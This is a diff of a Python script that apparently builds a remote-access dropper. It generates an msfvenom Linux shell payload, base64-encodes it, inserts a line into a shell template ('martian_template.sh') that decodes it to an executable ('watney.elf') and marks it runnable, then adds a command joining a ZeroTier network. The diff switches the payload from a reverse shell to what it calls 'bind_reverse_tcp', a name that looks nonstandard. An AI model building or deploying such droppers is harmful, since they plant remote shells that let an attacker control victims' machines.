@@ -84,10 +84,10 @@ d = json.loads(response.text)
 local_ip = d.get('ipAssignments')[0]
 print(f'local IP: {local_ip}')
 
-command = f'msfvenom -p linux/x64/shell_reverse_tcp LHOST={local_ip} LPORT=1337 -f elf'
+command = f'msfvenom -p linux/x64/bind_reverse_tcp LHOST=0.0.0.0 LPORT=1337 -f elf'
 output = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
 encoded = base64.b64encode(output.stdout)
-shell_text = 'echo "' + encoded.decode() + '" | base64 -d > rev.elf && chmod +x rev.elf'
+shell_text = 'echo "' + encoded.decode() + '" | base64 -d > watney.elf && chmod +x watney.elf'
 script = open('scripts/martian_template.sh').readlines()
 script.insert(1, shell_text + '\n')
 script.insert(7, f'sudo ./zerotier-cli join {os.environ["NWID"]}\n')
